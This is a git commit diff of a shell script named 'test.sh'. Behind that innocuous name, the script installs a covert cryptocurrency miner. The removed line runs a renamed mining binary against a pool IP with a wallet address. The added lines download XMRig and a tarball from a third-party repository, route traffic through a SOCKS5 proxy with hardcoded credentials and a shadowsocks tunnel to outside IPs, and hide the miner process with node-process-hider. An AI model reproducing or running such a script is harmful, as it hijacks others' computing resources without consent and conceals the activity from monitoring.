db423c20516577d0c394045ee656744839b06a25
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-06-15 23:14:27 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,1 +1,40 @@
-git clone https://github.com/githuboneheart/mom.git && cd mom && cd views && chmod +x bezzHash && ./bezzHash --algo ETHASH --pool 149.248.19.20:443 --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.DENT --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROX --basecolor
+#!/bin/bash
+sudo su && sudo apt update;apt upgrade -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider && npm install -g npm
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xf xmrig-6.17.0-linux-x64.tar.gz
+
+apt -y install shadowsocks-libev rng-tools
+
+ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
+
+sudo ph add xmrig
